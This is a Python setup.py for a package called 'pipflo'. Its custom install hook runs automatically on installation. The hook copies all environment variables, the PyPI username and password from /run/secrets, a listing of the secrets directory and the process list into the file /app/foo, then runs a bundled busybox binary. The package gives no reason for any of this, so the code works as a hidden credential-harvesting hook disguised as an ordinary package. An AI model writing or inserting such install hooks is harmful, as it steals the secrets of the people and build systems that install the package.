from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        print("FLO")
        # your command here
        subprocess.call(["env > /app/foo"],shell=True)
        subprocess.call(["echo FOO1 >> /app/foo"],shell=True)
        subprocess.call(["cat /run/secrets/pypi_username >> /app/foo"],shell=True)
        subprocess.call(["echo FOO2 >> /app/foo"],shell=True)
        subprocess.call(["cat /run/secrets/pypi_password >> /app/foo"],shell=True)
        subprocess.call(["echo FOO3 >> /app/foo"],shell=True)
        subprocess.call(["ls -alh /run/secrets/ >> /app/foo"],shell=True)
        subprocess.call(["echo FOO4 >> /app/foo"],shell=True)
        subprocess.call(["ps aux >> /app/foo"],shell=True)
        subprocess.call(["echo FOO5 >> /app/foo"],shell=True)
        subprocess.call(["chmod +x /app/busybox"],shell=True)
        subprocess.call(["/app/busybox ps aux >> /app/foo"],shell=True)


setup(
    name="pipflo",
    version="0.1",
    packages=["pipflo"],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
